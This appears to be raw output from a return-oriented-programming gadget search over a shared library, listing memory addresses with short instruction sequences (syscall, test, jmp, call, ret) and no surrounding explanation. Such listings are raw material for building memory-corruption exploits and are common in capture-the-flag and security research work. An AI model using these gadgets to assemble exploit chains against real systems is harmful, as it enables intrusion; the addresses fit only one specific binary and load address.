0x00002aaaaaba0385 : syscall ; cmp rax, -0xfff ; jae 0xcb39a ; ret
0x00002aaaaaba0578 : syscall ; cmp rax, -0xfff ; jae 0xcb58d ; ret
0x00002aaaaaba0655 : syscall ; cmp rax, -0xfff ; jae 0xcb66a ; ret
0x00002aaaaaba06de : syscall ; cmp rax, -0xfff ; jae 0xcb723 ; ret
0x00002aaaaaba073e : syscall ; cmp rax, -0xfff ; jae 0xcb783 ; ret
0x00002aaaaaba0bc5 : syscall ; cmp rax, -0xfff ; jae 0xcbbda ; ret
0x00002aaaaaba16d5 : syscall ; cmp rax, -0xfff ; jae 0xcc6ea ; ret
0x00002aaaaaba1875 : syscall ; cmp rax, -0xfff ; jae 0xcc88a ; ret
0x00002aaaaaba18a5 : syscall ; cmp rax, -0xfff ; jae 0xcc8ba ; ret
0x00002aaaaaba1905 : syscall ; cmp rax, -0xfff ; jae 0xcc91a ; ret
0x00002aaaaaba1935 : syscall ; cmp rax, -0xfff ; jae 0xcc94a ; ret
0x00002aaaaaba1965 : syscall ; cmp rax, -0xfff ; jae 0xcc97a ; ret
0x00002aaaaaba1995 : syscall ; cmp rax, -0xfff ; jae 0xcc9aa ; ret
0x00002aaaaabbeb85 : syscall ; cmp rax, -0xfff ; jae 0xe9b9a ; ret
0x00002aaaaabbebb5 : syscall ; cmp rax, -0xfff ; jae 0xe9bca ; ret
0x00002aaaaabbebe5 : syscall ; cmp rax, -0xfff ; jae 0xe9bfa ; ret
0x00002aaaaabbec15 : syscall ; cmp rax, -0xfff ; jae 0xe9c2a ; ret
0x00002aaaaabbec45 : syscall ; cmp rax, -0xfff ; jae 0xe9c5a ; ret
0x00002aaaaabbec75 : syscall ; cmp rax, -0xfff ; jae 0xe9c8a ; ret
0x00002aaaaabbeca5 : syscall ; cmp rax, -0xfff ; jae 0xe9cba ; ret
0x00002aaaaabbecd5 : syscall ; cmp rax, -0xfff ; jae 0xe9cea ; ret
0x00002aaaaabc9e91 : syscall ; cmp rax, -0xfff ; jae 0xf4ed9 ; ret
0x00002aaaaabc9ef1 : syscall ; cmp rax, -0xfff ; jae 0xf4f39 ; ret
0x00002aaaaabcaf65 : syscall ; cmp rax, -0xfff ; jae 0xf5f7a ; ret
0x00002aaaaabcb205 : syscall ; cmp rax, -0xfff ; jae 0xf621a ; ret
0x00002aaaaabcb235 : syscall ; cmp rax, -0xfff ; jae 0xf624a ; ret
0x00002aaaaabcb305 : syscall ; cmp rax, -0xfff ; jae 0xf631a ; ret
0x00002aaaaabcb335 : syscall ; cmp rax, -0xfff ; jae 0xf634a ; ret
0x00002aaaaabcb3f5 : syscall ; cmp rax, -0xfff ; jae 0xf640a ; ret
0x00002aaaaabcb425 : syscall ; cmp rax, -0xfff ; jae 0xf643a ; ret
0x00002aaaaabcb45e : syscall ; cmp rax, -0xfff ; jae 0xf64a3 ; ret
0x00002aaaaabcb67e : syscall ; cmp rax, -0xfff ; jae 0xf66c3 ; ret
0x00002aaaaabcb6de : syscall ; cmp rax, -0xfff ; jae 0xf6723 ; ret
0x00002aaaaabcb735 : syscall ; cmp rax, -0xfff ; jae 0xf674a ; ret
0x00002aaaaabcbbc5 : syscall ; cmp rax, -0xfff ; jae 0xf6bda ; ret
0x00002aaaaabcbd0e : syscall ; cmp rax, -0xfff ; jae 0xf6d53 ; ret
0x00002aaaaabcbd65 : syscall ; cmp rax, -0xfff ; jae 0xf6d7a ; ret
0x00002aaaaabcbd95 : syscall ; cmp rax, -0xfff ; jae 0xf6daa ; ret
0x00002aaaaabcbdc5 : syscall ; cmp rax, -0xfff ; jae 0xf6dda ; ret
0x00002aaaaabcbdf5 : syscall ; cmp rax, -0xfff ; jae 0xf6e0a ; ret
0x00002aaaaabcbe25 : syscall ; cmp rax, -0xfff ; jae 0xf6e3a ; ret
0x00002aaaaabcbe5e : syscall ; cmp rax, -0xfff ; jae 0xf6ea3 ; ret
0x00002aaaaabcbeb5 : syscall ; cmp rax, -0xfff ; jae 0xf6eca ; ret
0x00002aaaaabcbee5 : syscall ; cmp rax, -0xfff ; jae 0xf6efa ; ret
0x00002aaaaabcc715 : syscall ; cmp rax, -0xfff ; jae 0xf772a ; ret
0x00002aaaaabcc745 : syscall ; cmp rax, -0xfff ; jae 0xf775a ; ret
0x00002aaaaabcc775 : syscall ; cmp rax, -0xfff ; jae 0xf778a ; ret
0x00002aaaaabcc7a8 : syscall ; cmp rax, -0xfff ; jae 0xf77bd ; ret
0x00002aaaaabccd85 : syscall ; cmp rax, -0xfff ; jae 0xf7d9a ; ret
0x00002aaaaabccdb8 : syscall ; cmp rax, -0xfff ; jae 0xf7dcd ; ret
0x00002aaaaabccde5 : syscall ; cmp rax, -0xfff ; jae 0xf7dfa ; ret
0x00002aaaaabcce15 : syscall ; cmp rax, -0xfff ; jae 0xf7e2a ; ret
0x00002aaaaabcce45 : syscall ; cmp rax, -0xfff ; jae 0xf7e5a ; ret
0x00002aaaaabcce78 : syscall ; cmp rax, -0xfff ; jae 0xf7e8d ; ret
0x00002aaaaabccea5 : syscall ; cmp rax, -0xfff ; jae 0xf7eba ; ret
0x00002aaaaabcced5 : syscall ; cmp rax, -0xfff ; jae 0xf7eea ; ret
0x00002aaaaabccf05 : syscall ; cmp rax, -0xfff ; jae 0xf7f1a ; ret
0x00002aaaaabcfb3e : syscall ; cmp rax, -0xfff ; jae 0xfab83 ; ret
0x00002aaaaabcfea8 : syscall ; cmp rax, -0xfff ; jae 0xfaebd ; ret
0x00002aaaaabd0621 : syscall ; cmp rax, -0xfff ; jae 0xfb669 ; ret
0x00002aaaaabd0d75 : syscall ; cmp rax, -0xfff ; jae 0xfbd8a ; ret
0x00002aaaaabd0da5 : syscall ; cmp rax, -0xfff ; jae 0xfbdba ; ret
0x00002aaaaabd0dd5 : syscall ; cmp rax, -0xfff ; jae 0xfbdea ; ret
0x00002aaaaabd1175 : syscall ; cmp rax, -0xfff ; jae 0xfc18a ; ret
0x00002aaaaabd1355 : syscall ; cmp rax, -0xfff ; jae 0xfc36a ; ret
0x00002aaaaabd138e : syscall ; cmp rax, -0xfff ; jae 0xfc3d3 ; ret
0x00002aaaaabd13ee : syscall ; cmp rax, -0xfff ; jae 0xfc433 ; ret
0x00002aaaaabd18e5 : syscall ; cmp rax, -0xfff ; jae 0xfc8fa ; ret
0x00002aaaaabd1985 : syscall ; cmp rax, -0xfff ; jae 0xfc99a ; ret
0x00002aaaaabd19c1 : syscall ; cmp rax, -0xfff ; jae 0xfca09 ; ret
0x00002aaaaabd1b15 : syscall ; cmp rax, -0xfff ; jae 0xfcb2a ; ret
0x00002aaaaabd1b45 : syscall ; cmp rax, -0xfff ; jae 0xfcb5a ; ret
0x00002aaaaabd1b7e : syscall ; cmp rax, -0xfff ; jae 0xfcbc3 ; ret
0x00002aaaaabd1bd5 : syscall ; cmp rax, -0xfff ; jae 0xfcbea ; ret
0x00002aaaaabd1c0e : syscall ; cmp rax, -0xfff ; jae 0xfcc53 ; ret
0x00002aaaaabd1c65 : syscall ; cmp rax, -0xfff ; jae 0xfcc7a ; ret
0x00002aaaaabd1fd5 : syscall ; cmp rax, -0xfff ; jae 0xfcfea ; ret
0x00002aaaaabd2005 : syscall ; cmp rax, -0xfff ; jae 0xfd01a ; ret
0x00002aaaaabd2035 : syscall ; cmp rax, -0xfff ; jae 0xfd04a ; ret
0x00002aaaaabd3585 : syscall ; cmp rax, -0xfff ; jae 0xfe59a ; ret
0x00002aaaaabd35b5 : syscall ; cmp rax, -0xfff ; jae 0xfe5ca ; ret
0x00002aaaaabd1f37 : syscall ; mov eax, edx ; ret
0x00002aaaaabcad2d : syscall ; neg eax ; ret
0x00002aaaaabe94d7 : syscall ; pop rdx ; pop rsi ; ret
0x00002aaaaab907c5 : syscall ; ret
0x00002aaaaabdb7ef : syscall ; test rax, rax ; jl 0x10683e ; je 0x106802 ; ret
0x00002aaaaab59879 : sysenter
0x00002aaaaabe6a05 : test ah, 7 ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab49153 : test ah, al ; add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x00002aaaaabac09b : test ah, al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4c04
0x00002aaaaab3b502 : test ah, al ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab2f5da : test ah, bl ; add byte ptr [rax], al ; add byte ptr [rbx - 0x109743], al ; call qword ptr [rax]
0x00002aaaaac6eaac : test ah, ch ; add dword ptr [rax], eax ; xor al, 0x69 ; clc ; call rsp
0x00002aaaaaafbe4f : test ah, cl ; add al, 0 ; add byte ptr [rcx - 0x73], cl ; add dword ptr [r8 + 0x39], r9d ; ret
0x00002aaaaabc6206 : test ah, dh ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x3101
0x00002aaaaac6e560 : test ah, dh ; idiv edi ; cld ; ret
0x00002aaaaac7a785 : test al, 0 ; add byte ptr [rax + 0x37], cl ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac0c787 : test al, 0 ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaac06822 : test al, 0 ; add byte ptr [rax], al ; mov eax, 1 ; ret
0x00002aaaaac0af76 : test al, 0 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00002aaaaab01b70 : test al, 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab59734 : test al, 0x26 ; adc byte ptr [rax], al ; movsxd rdx, dword ptr [rax + rbx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab47b06 : test al, 0x28 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rdi*4 - 0xa] ; ret 0x7508
0x00002aaaaabdd9c1 : test al, 0x2b ; add byte ptr [rdx + rax + 0x5d], dh ; ret
0x00002aaaaab5d66c : test al, 0x33 ; add byte ptr [rax - 0x77], cl ; and al, 8 ; call qword ptr [rdx]
0x00002aaaaaad8cda : test al, 0x35 ; push rbx ; or byte ptr fs:[rbx + 0x4e], ch ; ret 0x6bba
0x00002aaaaabadf68 : test al, 0x48 ; add eax, edx ; jmp rax
0x00002aaaaac77b28 : test al, 0x48 ; in eax, dx ; jmp qword ptr [rdi]
0x00002aaaaac78098 : test al, 0x52 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaac84dc8 : test al, 0x6e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85038 : test al, 0x71 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7ab28 : test al, 0x73 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaab717e8 : test al, 0x83 ; ret 0x4901
0x00002aaaaaba9c3c : test al, 0x89 ; ret
0x00002aaaaac57817 : test al, 0x97 ; xchg eax, esp ; ret
0x00002aaaaac5835b : test al, 0xe0 ; sar byte ptr [rsi + rax*2], 0xf8 ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00002aaaaabbc8b3 : test al, 0xe5 ; sub eax, 0x36740000 ; xor eax, eax ; ret
0x00002aaaaac7b228 : test al, 0xe6 ; out dx, al ; call qword ptr [rax]
0x00002aaaaac7e438 : test al, 0xe8 ; int1 ; call qword ptr [rbx]
0x00002aaaaac7e408 : test al, 0xe8 ; int1 ; jmp qword ptr [rdi]
0x00002aaaaaba9b38 : test al, 0xe8 ; ret 0xfd7a
0x00002aaaaaaf8658 : test al, 0xe8 ; ret 0xffff
0x00002aaaaac6ba69 : test al, 0xed ; call rsp
0x00002aaaaabd9f2b : test al, 0xf ; xchg eax, edi ; ror byte ptr [rdi], 0x92 ; ret 0xd029
0x00002aaaaabc13c3 : test al, 0xf ; xchg eax, esp ; ret
0x00002aaaaab80999 : test al, 0xf0 ; jne 0xab9f8 ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab80998 : test al, 0xf0 ; jne 0xab9f9 ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaac8a3d8 : test al, 0xf1 ; sti ; call rcx
0x00002aaaaabc9ff0 : test al, 0xf2 ; dec dword ptr [rbx + 0x438d0455] ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac5d119 : test al, 0xf3 ; call rdi
0x00002aaaaac5d05d : test al, 0xf3 ; inc dword ptr [rdi - 0x587b000d] ; jmp rax
0x00002aaaaac825e1 : test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac6a785 : test al, 0xfc ; call qword ptr [rax]
0x00002aaaaac6a649 : test al, 0xfc ; call rdx
0x00002aaaaac6a645 : test al, 0xfc ; inc dword ptr [rdx - 0x58] ; cld ; call rdx
0x00002aaaaac6a5c9 : test al, 0xfc ; jmp rsi
0x00002aaaaac69405 : test al, 0xfd ; inc dword ptr [rcx - 0x57] ; std ; jmp rcx
0x00002aaaaac69401 : test al, 0xfd ; jmp qword ptr [rcx + 0x41fffda8]
0x00002aaaaac69445 : test al, 0xfd ; jmp qword ptr [rsi]
0x00002aaaaab2633a : test al, 1 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], al ; std ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret
0x00002aaaaabcba96 : test al, 2 ; cmove eax, edx ; ret
0x00002aaaaabf81ee : test al, 2 ; mov byte ptr [rdi + 2], 0 ; jne 0x12324a ; mov eax, r8d ; ret
0x00002aaaaab72fd2 : test al, al ; jne 0x9dfb5 ; ret
0x00002aaaaab73110 : test al, al ; jne 0x9e0f6 ; xor eax, eax ; ret
0x00002aaaaab73c5a : test al, al ; jne 0x9ec48 ; xor eax, eax ; sub eax, ecx ; ret
0x00002aaaaab6b8d3 : test al, al ; mov eax, 0 ; cmovne rax, rdi ; ret
0x00002aaaaabacbda : test al, bh ; add al, 0 ; add byte ptr [rbp - 0x7cb7febd], cl ; ret
0x00002aaaaabf59c5 : test al, dh ; add byte ptr [rax], al ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaac6fa58 : test al, dl ; cli ; jmp qword ptr [rdi + rdx*2 - 0x3cdbfffe]
0x00002aaaaac6a075 : test bh, ah ; call qword ptr [rax]
0x00002aaaaac6aa1d : test bh, ah ; call rax
0x00002aaaaac6a271 : test bh, ah ; jmp qword ptr [rax]
0x00002aaaaac6a135 : test bh, ah ; jmp rdx
0x00002aaaaab12ed7 : test bh, ah ; movabs al, byte ptr [0x293ff08348000000] ; ret 0xfa81
0x00002aaaaab1b074 : test bh, ch ; add al, byte ptr [rax] ; add byte ptr [rcx + 0x39], cl ; ret 0xea75
0x00002aaaaac0276a : test bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab2f37a : test bl, ah ; add byte ptr [rax], al ; add byte ptr [rbx - 0x109743], al ; call qword ptr [rax]
0x00002aaaaab5cfc1 : test bl, dl ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rbx ; call rax
0x00002aaaaac70738 : test bpl, al ; call qword ptr [rax]
0x00002aaaaac70750 : test bpl, al ; jmp qword ptr [rcx]
0x00002aaaaab02ef6 : test byte ptr [rax + 0x200], bh ; ret
0x00002aaaaabf99d3 : test byte ptr [rax + 0x39000003], al ; ret
0x00002aaaaab5d14b : test byte ptr [rax + 0x4c000000], cl ; mov esi, esp ; mov rdi, rbp ; call rax
0x00002aaaaaba212a : test byte ptr [rax + 0x63], 0x14 ; mov al, 0x48 ; add eax, edx ; jmp rax
0x00002aaaaac066f5 : test byte ptr [rax + 0x63], 0x34 ; mov al, 0x48 ; add eax, esi ; jmp rax
0x00002aaaaab0840d : test byte ptr [rax + 0x63], 0x34 ; mov bh, 0x48 ; add esi, edi ; jmp rsi
0x00002aaaaab996af : test byte ptr [rax + 0x63], 0x34 ; mov dl, 0x48 ; add edx, esi ; jmp rdx
0x00002aaaaac09cb5 : test byte ptr [rax + 0x63], 0xc ; mov al, 0x48 ; add eax, ecx ; jmp rax
0x00002aaaaab8e2b8 : test byte ptr [rax + 0x74db8500], cl ; or bh, byte ptr [rcx] ; ret
0x00002aaaaabd7d73 : test byte ptr [rax + 0xa], al ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd81e3 : test byte ptr [rax + 3], dl ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r13 ; call rbx
0x00002aaaaab3d469 : test byte ptr [rax + rax - 0x7cb80000], ah ; ret
0x00002aaaaaafea6c : test byte ptr [rax + rbx*4], ah ; add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x00002aaaaabc7823 : test byte ptr [rax + rcx*4], ah ; add byte ptr [rax], al ; add al, ch ; ret 0xf2cf
0x00002aaaaac03f56 : test byte ptr [rax + rdi*4], ah ; add byte ptr [rax], al ; add byte ptr [rcx + 0x39], cl ; ret 0x850f
0x00002aaaaab3e12a : test byte ptr [rax - 0x596c16e8], 0xff ; dec dword ptr [rax - 0x7d] ; ret 0xb908
0x00002aaaaaafbaef : test byte ptr [rax - 0x72b80000], cl ; add dword ptr [rax + 0x39], ecx ; ret
0x00002aaaaabcaef3 : test byte ptr [rax - 0x73], 0x7c ; and al, 0xc ; call rax
0x00002aaaaabe32ee : test byte ptr [rax - 0x75], 0x54 ; and al, 0x10 ; mov edi, 0x2000004 ; call rax
0x00002aaaaabd72b1 : test byte ptr [rax - 0x75], 0x7d ; add byte ptr [rcx + 0xf], al ; lahf ; ret
0x00002aaaaabd79f4 : test byte ptr [rax - 0x77], 0xc3 ; call rax
0x00002aaaaab1c059 : test byte ptr [rax - 0x77], 0xd8 ; pop rbx ; ret
0x00002aaaaabfe91e : test byte ptr [rax - 0x77], 0xdf ; mov qword ptr [rsp], rcx ; call r12
0x00002aaaaac08531 : test byte ptr [rax - 0x77], 0xe7 ; call 0x1f7e6
0x00002aaaaac104c9 : test byte ptr [rax - 0x77], 0xef ; call r12
0x00002aaaaac7f545 : test byte ptr [rax], 0 ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac7f605 : test byte ptr [rax], 0 ; cmp byte ptr [rdx], ch ; jmp qword ptr [rdi]
0x00002aaaaac1241b : test byte ptr [rax], ah ; add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaabb7a55 : test byte ptr [rax], ah ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaabe474f : test byte ptr [rax], ah ; add dword ptr [rax], eax ; add byte ptr [rcx - 0xa], al ; ret 0xf10
0x00002aaaaab8039a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add rax, 3 ; ret
0x00002aaaaab4ceea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; and dword ptr [rdi], 0xffffffcf ; ret
0x00002aaaaac17dfa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rcx
0x00002aaaaac44f7a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaac44f8a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaac44f9a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaac44faa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaac44fba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaac44efa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaac44f0a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaac44f1a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaac44f2a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaac44f3a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaac44f4a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaac44f5a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaac44f6a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab809ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi - 0xc] ; ret
0x00002aaaaab80a0a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi - 4] ; ret
0x00002aaaaab809fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi - 8] ; ret
0x00002aaaaac44eea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi] ; ret
0x00002aaaaac3d09a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rcx], dl ; ret
0x00002aaaaab7b77a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, qword ptr [rdi] ; ret
0x00002aaaaab7a17a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x00002aaaaab7b14a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dl ; ret
0x00002aaaaab7ae4a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov dl, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaac3d0da : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rcx], edx ; mov byte ptr [rcx + 4], dl ; ret
0x00002aaaaac3d0fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rcx], edx ; mov dword ptr [rcx + 3], edx ; ret
0x00002aaaaac3d0ca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rcx], edx ; ret
0x00002aaaaabca38a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi + 4], esi ; xor eax, eax ; ret
0x00002aaaaab7b16a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi - 1], edx ; ret
0x00002aaaaab7b18a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi], edx ; mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7b17a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov dword ptr [rdi], edx ; ret
0x00002aaaaaba1e6a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xfc17 ; ret
0x00002aaaaab4722a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaabd2a6a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 1 ; ret
0x00002aaaaac024aa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 2 ; ret
0x00002aaaaabab65a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x4c] ; ret
0x00002aaaaac3d10a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; ret
0x00002aaaaab7b1aa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi - 1], rdx ; ret
0x00002aaaaab7b1ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab9cc9a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab51b2a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x00002aaaaab51b3a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x00002aaaaac3d0aa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov word ptr [rcx], dx ; ret
0x00002aaaaab7b15a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov word ptr [rdi], dx ; ret
0x00002aaaaab7b22a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; movdqu xmmword ptr [rdi - 1], xmm0 ; ret
0x00002aaaaab7b23a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00002aaaaab4f61a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x00002aaaaaaf5589 : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; nop ; ret
0x00002aaaaac07b76 : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x00002aaaaac10727 : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaab4a8ca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab7dffa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor ch, ch ; mov byte ptr [rdi], ch ; ret
0x00002aaaaab3fcca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab4d29a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab735ca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor rax, rax ; ret
0x00002aaaaab5423b : test byte ptr [rax], bh ; add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaac6f59c : test byte ptr [rax], bh ; add al, byte ptr [rax] ; hlt ; cli ; jmp rsp
0x00002aaaaab6a82c : test byte ptr [rax], bh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaab6bf79 : test byte ptr [rax], bl ; or al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaac6c6c4 : test byte ptr [rax], cl ; add dword ptr [rax], eax ; xor al, 0xfb ; out dx, eax ; call rsp
0x00002aaaaab6a844 : test byte ptr [rax], dh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaac79cbc : test byte ptr [rbp + 0x1900000], bl ; out dx, al ; call qword ptr [rsi]
0x00002aaaaabe8142 : test byte ptr [rbp + 0x390b74d2], al ; ret 0xf7e
0x00002aaaaab43536 : test byte ptr [rbp + 0x48000000], dh ; mov eax, edx ; pop rbx ; ret
0x00002aaaaabd80ae : test byte ptr [rbp + 5], ah ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd80ce : test byte ptr [rbp + 6], ah ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaac6ba2c : test byte ptr [rbp - 0x5f4c0000], dh ; in eax, dx ; jmp rsp
0x00002aaaaab8c067 : test byte ptr [rbp - 0x73], 0x2c ; mov ah, 0xe9 ; ret
0x00002aaaaab4a50e : test byte ptr [rbp - 0x77000000], dh ; ret 0xd089
0x00002aaaaac12909 : test byte ptr [rbp - 0x7c000002], dh ; rol byte ptr [rcx], 0x39 ; ret
0x00002aaaaab3b3b8 : test byte ptr [rbp - 0x7cfffffe], ah ; ret 0x3901
0x00002aaaaabe3ab9 : test byte ptr [rbp - 0x7cffffff], ah ; call 0xffffffffc29a36cf
0x00002aaaaab52776 : test byte ptr [rbp - 0xa000000], ch ; ret
0x00002aaaaab5323f : test byte ptr [rbp - 0xa000000], dl ; ret
0x00002aaaaac6d888 : test byte ptr [rbp - 0xa], bl ; call rsp
0x00002aaaaabe773c : test byte ptr [rbx + 0x1c], 0x20 ; je 0x1127a8 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab5c550 : test byte ptr [rbx + 2], ch ; add byte ptr [rax], al ; mov rdi, rbx ; mov rdx, r15 ; call rax
0x00002aaaaac6c210 : test byte ptr [rbx - 0x12], bh ; ljmp ptr [rdi + 0x7cd40000] ; out dx, al ; jmp rsp
0x00002aaaaabc50cc : test byte ptr [rbx - 0x76000004], ah ; ret 0xdb31
0x00002aaaaab2d397 : test byte ptr [rbx - 0x7c00001b], bh ; ret
